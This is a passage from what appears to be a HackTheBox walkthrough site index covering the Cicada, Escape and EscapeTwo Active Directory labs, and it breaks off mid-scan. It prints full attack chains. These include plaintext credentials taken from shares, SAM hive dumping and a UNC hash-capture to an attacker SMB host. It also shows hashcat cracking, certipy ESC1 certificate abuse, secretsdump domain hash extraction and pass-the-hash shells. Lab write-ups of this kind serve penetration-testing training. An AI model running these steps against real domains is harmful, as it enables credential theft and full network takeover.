Oscars      Desc: (null)\nindex: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain\nindex: 0xfe7 RID: 0x450 acb: 0x00000210 Account: john.smoulder  Name: (null)    Desc: (null)\nindex: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account\nindex: 0xfe9 RID: 0x452 acb: 0x00000210 Account: michael.wrightson      Name: (null)    Desc: (null)\nindex: 0xfe8 RID: 0x451 acb: 0x00000210 Account: sarah.dantelia Name: (null)    Desc: (null)\n</code></pre> <p><code>david.orelious:aRt$Lp#7t*VQ!3</code></p> <p>Now we can read the <code>DEV</code> share.</p> <p></p> <p>There is a backup script inside with another password.</p> <pre><code>$ smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' //10.10.11.35/dev \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Thu Mar 14 13:31:39 2024\n  ..                                  D        0  Thu Mar 14 13:21:29 2024\n  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024\n\n                4168447 blocks of size 4096. 448355 blocks available\nsmb: \\&gt; get Backup_script.ps1 \ngetting file \\Backup_script.ps1 of size 601 as Backup_script.ps1 (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)\nsmb: \\&gt; exit\n\n$ cat Backup_script.ps1 \n\n$sourceDirectory = \"C:\\smb\"\n$destinationDirectory = \"D:\\Backup\"\n\n$username = \"emily.oscars\"\n$password = ConvertTo-SecureString \"Q!3@Lp#M6b*7t*Vt\" -AsPlainText -Force\n$credentials = New-Object System.Management.Automation.PSCredential($username, $password)\n$dateStamp = Get-Date -Format \"yyyyMMdd_HHmmss\"\n$backupFileName = \"smb_backup_$dateStamp.zip\"\n$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName\nCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath\nWrite-Host \"Backup completed successfully. Backup file saved to: $backupFilePath\"\n</code></pre> <p><code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code></p> <pre><code>$ nxc winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'\nWINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)\nWINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)\n</code></pre> <p>Enter the machine via <code>evil-winrm</code>:</p> <pre><code>$ evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'           \nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Documents&gt; whoami\ncicada\\emily.oscars\n</code></pre> <p>Get the flag:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\desktop&gt; type user.txt\n804832f92cbda6bb4221fd4c849f1f33\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cicada/#privilege-escalation","title":"Privilege Escalation","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\desktop&gt; whoami /all\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                 Type             SID          Attributes\n========================================== ================ ============ ==================================================\nEveryone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level       Label            S-1-16-12288\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n</code></pre> <p>Emily belongs to the <code>Backup Operators</code> group and thus has <code>SeBackupPrivilege</code> permissions.</p> <p>Get the <code>SAM</code> and <code>SYSTEM</code> from the registry and download them:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\desktop&gt; reg save HKLM\\system system\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\desktop&gt; reg save HKLM\\sam sam\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\desktop&gt; download system\nInfo: Download successful!\n*Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\desktop&gt; download sam\nInfo: Download successful!\n</code></pre> <p>Now, using <code>pypykatz</code>, extract the hashes:</p> <pre><code>$ pypykatz registry --sam sam system\nWARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work\nWARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work\n============== SYSTEM hive secrets ==============\nCurrentControlSet: ControlSet001\nBoot Key: 3c2b033757a49110a9ee680b46e8d620\n============== SAM hive secrets ==============\nHBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n</code></pre> <p>Lastly, using the administrator's hash, enter the machine via <code>evil-winrm</code>:</p> <pre><code>$ evil-winrm -i 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\ncicada\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"cicada/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\ncbd64c27c1c7238f8e3a56d48c110a99\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escape/","title":"Escape","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escape/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.202\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 21:33 CEST\nNmap scan report for 10.10.11.202\nHost is up (0.041s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        (generic dns response: SERVFAIL)\n| fingerprint-strings: \n|   DNS-SD-TCP: \n|     _services\n|     _dns-sd\n|     _udp\n|_    local\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-06 03:33:37Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.\n| ms-sql-ntlm-info: \n|   10.10.11.202:1433: \n|     Target_Name: sequel\n|     NetBIOS_Domain_Name: sequel\n|     NetBIOS_Computer_Name: DC\n|     DNS_Domain_Name: sequel.htb\n|     DNS_Computer_Name: dc.sequel.htb\n|     DNS_Tree_Name: sequel.htb\n|_    Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-05-05T01:14:52\n|_Not valid after:  2055-05-05T01:14:52\n| ms-sql-info: \n|   10.10.11.202:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: \n| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel\n| Not valid before: 2024-01-18T23:03:57\n|_Not valid after:  2074-01-05T23:03:57\n|_ssl-date: 2025-05-06T03:35:11+00:00; +8h00m00s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49690/tcp open  msrpc         Microsoft Windows RPC\n49708/tcp open  msrpc         Microsoft Windows RPC\n49725/tcp open  msrpc         Microsoft Windows RPC\n49744/tcp open  msrpc         Microsoft Windows RPC\n</code></pre> <p>Enter anonymously in the <code>Public</code> share and get the PDF.</p> <pre><code>$ smbclient -U '' //10.10.11.202/Public\nPassword for [WORKGROUP\\]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sat Nov 19 12:51:25 2022\n  ..                                  D        0  Sat Nov 19 12:51:25 2022\n  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022\n\n                5184255 blocks of size 4096. 1430985 blocks available\nsmb: \\&gt; get \"sql server procedures.pdf\"\ngetting file \\sql server procedures.pdf of size 49551 as sql server procedures.pdf (234.9 KiloBytes/sec) (average 234.9 KiloBytes/sec)\nsmb: \\&gt; exit\n</code></pre> <p></p> <p>So we have a <code>brandon</code> user with <code>brandon.brown@sequel.htb</code> and <code>PublicUser:GuestUserCantWrite1</code>.</p> <p>Using those credentials, enter the instance.</p> <pre><code>$ impacket-mssqlclient sequel.htb/publicuser:'GuestUserCantWrite1'@10.10.11.202\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC\\SQLMOCK): Line 1: Changed database context to 'master'.\n[*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (PublicUser  guest@master)&gt;\n</code></pre> <p>We can perform a <code>UNC</code> attack to get the <code>NTLM</code> hash.</p> <pre><code>SQL (PublicUser  guest@master)&gt; exec master.dbo.xp_dirtree '\\\\10.10.14.13\\asdf'\nsubdirectory   depth   \n</code></pre> <pre><code>$ impacket-smbserver -smb2support kali .   \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Incoming connection (10.10.11.202,62990)\n[*] AUTHENTICATE_MESSAGE (sequel\\sql_svc,DC)\n[*] User DC\\sql_svc authenticated successfully\n[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:1295801fe2a8d14070d75cab06076b69:010100000000000000235fc909bedb013b3503531870fc9f00000000010010006d0044005900650050004e0045004200030010006d0044005900650050004e0045004200020010004f00570050007900550061007a005200040010004f00570050007900550061007a0052000700080000235fc909bedb01060004000200000008003000300000000000000000000000003000002fd21b6e1d9e5e2f0899c98a2190b46d2ec5e7edea24dfbf9b02f1b91ffe0c540a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000\n[*] Closing down connection (10.10.11.202,62990)\n[*] Remaining connections []\n</code></pre> <p>Using <code>hashcat</code>:</p> <pre><code>$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force \nhashcat (v6.2.6) starting\n...\nSQL_SVC::sequel:aaaaaaaaaaaaaaaa:1295801fe2a8d14070d75cab06076b69:010100000000000000235fc909bedb013b3503531870fc9f00000000010010006d0044005900650050004e0045004200030010006d0044005900650050004e0045004200020010004f00570050007900550061007a005200040010004f00570050007900550061007a0052000700080000235fc909bedb01060004000200000008003000300000000000000000000000003000002fd21b6e1d9e5e2f0899c98a2190b46d2ec5e7edea24dfbf9b02f1b91ffe0c540a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310033000000000000000000:REGGIE1234ronnie\n</code></pre> <p>We can get all users.</p> <p></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escape/#initial-access","title":"Initial Access","text":"<p>This user can access <code>winrm</code> on the host.</p> <p></p> <pre><code>$ evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie                     \n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\sql_svc\\Documents&gt; whoami\nsequel\\sql_svc\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escape/#privilege-escalation","title":"Privilege Escalation","text":"<p>Searching in <code>C:\\</code> there is a <code>sqlserver</code> folder, and inside there are the logs.</p> <pre><code>*Evil-WinRM* PS C:\\sqlserver&gt; ls\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         2/7/2023   8:06 AM                Logs\nd-----       11/18/2022   1:37 PM                SQLEXPR_2019\n-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe\n-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe\n\n*Evil-WinRM* PS C:\\sqlserver&gt; cd logs\n*Evil-WinRM* PS C:\\sqlserver\\logs&gt; ls\n\n    Directory: C:\\sqlserver\\logs\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK\n\n*Evil-WinRM* PS C:\\sqlserver\\logs&gt; type errorlog.bak\n2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 &lt;X64&gt; (Build 17763: ) (Hypervisor)\n\n...\n2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.\n2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\\Ryan.Cooper'. Reason: Password did not match that for the logovided. [CLIENT: 127.0.0.1]\n2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.\n2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login pro. [CLIENT: 127.0.0.1]\n2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No action is required.\n2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute ex\n</code></pre> <p>It seems that <code>ryan.cooper</code> entered his password instead of the username, so <code>ryan.cooper:NuclearMosquito3</code>.</p> <p></p> <pre><code>$ evil-winrm -i 10.10.11.202 -u ryan.cooper -p NuclearMosquito3\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents&gt; whoami\nsequel\\ryan.cooper\n</code></pre> <p>Get the flag.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\desktop&gt; type user.txt\n79eb702b385547cbb18f054fa9246173\n</code></pre> <p>Transfer <code>adPEAS</code> to the host.</p> <p></p> <p>The template has the <code>ENROLLEE_SUPPLIES_SUBJECT</code> flag; using <code>certipy</code> we can exploit this. (reference)</p> <pre><code>$ certipy-ad find -vulnerable -dc-ip 10.10.11.202 -u ryan.cooper@sequel.htb -p 'NuclearMosquito3'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP\n[*] Got CA configuration for 'sequel-DC-CA'\n[*] Saved BloodHound data to '20250506093829_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k\n[*] Saved text output to '20250506093829_Certipy.txt'\n[*] Saved JSON output to '20250506093829_Certipy.json'\n\n$ cat 20250506093829_Certipy.txt \nCertificate Authorities\n  0\n    CA Name                             : sequel-DC-CA\n    DNS Name                            : dc.sequel.htb\n    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb\n    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101\n    Certificate Validity Start          : 2022-11-18 20:58:46+00:00\n    Certificate Validity End            : 2121-11-18 21:08:46+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Permissions\n      Owner                             : SEQUEL.HTB\\Administrators\n      Access Rights\n        ManageCertificates              : SEQUEL.HTB\\Administrators\n                                          SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n        ManageCa                        : SEQUEL.HTB\\Administrators\n                                          SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n        Enroll                          : SEQUEL.HTB\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : UserAuthentication\n    Display Name                        : UserAuthentication\n    Certificate Authorities             : sequel-DC-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : PublishToDs\n                                          IncludeSymmetricAlgorithms\n    Private Key Flag                    : ExportableKey\n    Extended Key Usage                  : Client Authentication\n                                          Secure Email\n                                          Encrypting File System\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 10 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Domain Users\n                                          SEQUEL.HTB\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : SEQUEL.HTB\\Administrator\n        Write Owner Principals          : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Administrator\n        Write Dacl Principals           : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Administrator\n        Write Property Principals       : SEQUEL.HTB\\Domain Admins\n                                          SEQUEL.HTB\\Enterprise Admins\n                                          SEQUEL.HTB\\Administrator\n    [!] Vulnerabilities\n      ESC1                              : 'SEQUEL.HTB\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication\n</code></pre> <p>Request a certificate with the admin <code>SAN</code>.</p> <pre><code>$ certipy-ad req -dc-ip 10.10.11.202 -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -ca sequel-DC-CA -target DC.sequel.htb -template UserAuthentication -upn Administrator@sequel.htb -dns DC.sequel.htb\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence '\\('\n  \"(0x[a-zA-Z0-9]+) \\([-]?[0-9]+ \",\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 23\n[*] Got certificate with multiple identifications\n    UPN: 'Administrator@sequel.htb'\n    DNS Host Name: 'DC.sequel.htb'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator_dc.pfx'\n</code></pre> <p>Authenticate against the <code>DC</code> using the admin cert.</p> <pre><code>$ certipy-ad auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Found multiple identifications in certificate\n[*] Please select one:\n    [0] UPN: 'Administrator@sequel.htb'\n    [1] DNS Host Name: 'DC.sequel.htb'\n&gt; 1\n[*] Using principal: dc$@sequel.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'dc.ccache'\n[*] Trying to retrieve NT hash for 'dc$'\n[*] Got hash for 'dc$@sequel.htb': aad3b435b51404eeaad3b435b51404ee:db6875e6546cf4e2ebb1d309a94bcdb6\n</code></pre> <p>Now dump the hashes and <code>LSA</code> secrets using <code>secretsdump</code>.</p> <pre><code>$ impacket-secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:db6875e6546cf4e2ebb1d309a94bcdb6' 'sequel.htb/dc$@10.10.11.202'\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::\nTom.Henn:1103:aad3b435b51404eeaad3b435b51404ee:22e99d2b3043bbb0a480705c9b0e71ac:::\nBrandon.Brown:1104:aad3b435b51404eeaad3b435b51404ee:f562f509ad646c666f83b45f90a58af3:::\nRyan.Cooper:1105:aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945:::\nsql_svc:1106:aad3b435b51404eeaad3b435b51404ee:1443ec19da4dac4ffc953bca1b57b4cf:::\nJames.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:cc69ea05e9ab430702679d5706b39075:::\nNicole.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:235da7fbef7d0861301b4078d56afdc5:::\nDC$:1000:aad3b435b51404eeaad3b435b51404ee:db6875e6546cf4e2ebb1d309a94bcdb6:::\n...\n...\n[*] Cleaning up... \n</code></pre> <p>Using <code>evil-winrm</code>, enter the <code>DC</code>.</p> <pre><code>$ evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee\n\nEvil-WinRM shell v3.7\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; whoami\nsequel\\administrator\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escape/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\desktop&gt; type root.txt\n770c060ea664ba5922aee6a3f46a6322\n</code></pre>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escapetwo/","title":"EscapeTwo","text":"","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escapetwo/#machine-information","title":"Machine Information","text":"<p>As is common in real-life Windows pentests, you will start this box with credentials for the following account: <code>rose:KxEPkKe6R8su</code></p>","tags":["\ud83d\uddc3\ufe0f Active Directory","\ud83d\udce6 HackTheBox","HackTheBox","Active Directory"]},{"location":"escapetwo/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.51\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 16:34 CEST\nNmap scan report for 10.10.11.51\nHost is up (0.041s latency).\nNot shown: 65510 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        (generic dns response: SERVFAIL)\n| fingerprint-strings: \n|   DNS-SD-TCP: \n|     _services\n|     _dns-sd\n|     _udp\n|_    local\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-14 14:35:10Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-06-14T14:36:43+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.sequel.htb\n| Not valid before: 2024-06-08T17:35:00\n|_Not valid after:  2025-06-08T17:35:00\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.sequel.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.sequel.htb\n| Not valid before: 2024-06-08T17:35:00\n|_Not valid after:  2025-06-08T17:35:00\n|_ssl-date: 2025-06-14T14:36:43+00:00; 0s from scanner time.\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info: \n|   10.10.11.51:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n|_ssl-date: 2025-06-14T14:36:43+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-06-14T14:34:23\n|_Not valid after:  2055-06-14T14:34:23\n| ms-sql-ntlm-info: \n|   10.10.11.51:1433: \n|     Target_Name: SEQUEL\n|     NetBIOS_Domain_Name: SEQUEL\n|     NetBIOS_Computer_Name: DC01\n|     DNS_Domain_Name: sequel.htb\n|     DNS_Computer_Name: DC01.sequel.htb\n|     DNS_Tree_Name: sequel.htb\n|_    Product_Version: 10.0.17763\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-06-14T14:36:43+00:00; 0s from scanner time.\n| 